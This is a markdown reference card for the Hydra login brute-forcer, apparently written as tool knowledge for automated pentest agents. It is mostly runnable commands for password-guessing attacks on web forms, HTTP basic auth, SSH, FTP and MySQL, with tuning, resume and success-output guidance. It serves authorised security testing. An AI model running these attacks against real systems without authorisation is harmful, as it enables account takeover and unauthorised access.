---
tool_name: hydra
category: exploitation
tags: [brute-force, password-cracking, login, authentication, web-forms]
used_by_agents: [brute_force_agent, planner_agent]
---

# Hydra — Network Login Brute Forcer

## What It Does
Fast, parallelized online password brute forcer. Supports 50+ protocols. For web app testing, the key modules are `http-get-form`, `http-post-form`, and basic auth.

---

## Web Form Brute Force (Most Common Use)

### HTTP GET form
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com \
  http-get-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

### HTTP POST form
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com \
  http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

### HTTPS POST form
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  -s 443 target.com \
  https-post-form "/login:user=^USER^&pass=^PASS^:F=Login failed"
```

### With cookies (for authenticated pages)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=abc123; security=low"
```

### Match success string instead of failure
```bash
hydra -l admin -P wordlist.txt \
  target.com \
  http-post-form "/login:user=^USER^&pass=^PASS^:S=Welcome"
```

### Multiple usernames
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  target.com \
  http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

### Colon-separated credentials file
```bash
hydra -C creds.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

---

## HTTP Basic Authentication

```bash
hydra -l admin -P wordlist.txt http-get://target.com/admin
hydra -l admin -P wordlist.txt http-get://target.com/protected/area
```

---

## Other Web-Relevant Protocols

### SSH
```bash
hydra -l root -P wordlist.txt ssh://target.com -t 4
```

### FTP
```bash
hydra -l admin -P wordlist.txt ftp://target.com
```

### MySQL
```bash
hydra -l root -P wordlist.txt mysql://target.com
```

---

## Performance Tuning

```bash
# Threads (default 16, reduce for rate-limited targets)
hydra -l admin -P wordlist.txt target.com http-post-form "..." -t 4

# High threads for fast targets
hydra -l admin -P wordlist.txt target.com http-post-form "..." -t 32

# Wait time between connections (seconds)
hydra -l admin -P wordlist.txt target.com http-post-form "..." -W 5

# Connection timeout
hydra -l admin -P wordlist.txt target.com http-post-form "..." -w 30
```

---

## Output & Resume

```bash
# Save results to file
hydra -l admin -P wordlist.txt target.com http-post-form "..." -o results.txt

# JSON output
hydra -l admin -P wordlist.txt target.com http-post-form "..." -o results.txt -b json

# Resume interrupted attack
hydra -R

# Force start (ignore previous restore file)
hydra -l admin -P wordlist.txt target.com http-post-form "..." -I
```

---

## Output Interpretation

### Password found:
```
[80][http-post-form] host: target.com   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
```
**Success indicators**: `[http-post-form]` line with `login:` and `password:` values, "valid password found"

### No password found:
```
1 of 1 target completed, 0 valid passwords found
```
**Failure indicators**: "0 valid passwords found"

### Connection/rate issues:
```
[ERROR] Too many connect errors to target, exiting
[WARNING] Restorefile exists, using it
```
Reduce threads (`-t 4`) or add wait time (`-W 2`).

---

## Form Syntax Explained

The form module syntax is:
```
"<path>:<form-parameters>:<failure-or-success-string>[:optional-headers]"
```

- `^USER^` — replaced with username from `-l` or `-L`
- `^PASS^` — replaced with password from `-p` or `-P`
- `F=text` — **failure** condition: this text appears on failed login
- `S=text` — **success** condition: this text appears on successful login
- `H=Header: value` — optional custom headers (cookies, etc.)

---

## Common Flags Reference

| Flag | Purpose |
|------|---------|
| `-l` | Single username |
| `-L` | Username wordlist file |
| `-p` | Single password |
| `-P` | Password wordlist file |
| `-C` | Colon-separated user:pass file |
| `-s` | Target port (if non-default) |
| `-t` | Number of parallel threads (default 16) |
| `-w` | Connection timeout in seconds (default 30) |
| `-W` | Wait time between connections |
| `-o` | Output file |
| `-b` | Output format (text, json) |
| `-v` | Verbose mode |
| `-V` | Show each attempt (very verbose) |
| `-I` | Ignore existing restore file |
| `-R` | Resume previous session |
| `F=` | Failure string in form module |
| `S=` | Success string in form module |
| `H=` | Custom header in form module |
